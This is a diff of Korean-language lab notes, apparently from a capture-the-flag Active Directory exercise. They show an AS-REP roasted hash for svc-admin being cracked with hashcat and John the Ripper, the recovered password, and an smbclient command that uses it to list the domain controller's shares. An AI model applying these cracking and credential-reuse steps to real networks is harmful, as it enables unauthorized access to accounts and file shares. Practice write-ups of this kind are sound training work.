@@ -374,4 +374,34 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<암호화된 해시>
 
 # crack hash
 
+# 특이하게 해시 크랙시 해당 행 전체를 넣어야 합니다.
+# 예시: $krb5asrep$23$svc-admin@SPOOK~
+
 hashcat -m 18200 -a 0 -o cracked.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt
+
+john 해시파일
+
+┌──(impacket-env)─(kali㉿vbox)-[~]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
+1g 0:00:00:00 DONE (2025-07-06 08:44) 50.00g/s 409600p/s 409600c/s 409600C/s newzealand..whitey
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+
+# management2005 비밀번호 획득
+
+# smbclient
+
+apt install smbclient
+
+
+smbclient -k -L spookysec.local -U svc-admin%management2005
+
+-L : 도메인 컨트롤러의 공유 목록을 나열합니다.
+-k : Kerberos 인증을 사용합니다.
+-U : 사용자 이름과 비밀번호를 지정합니다.
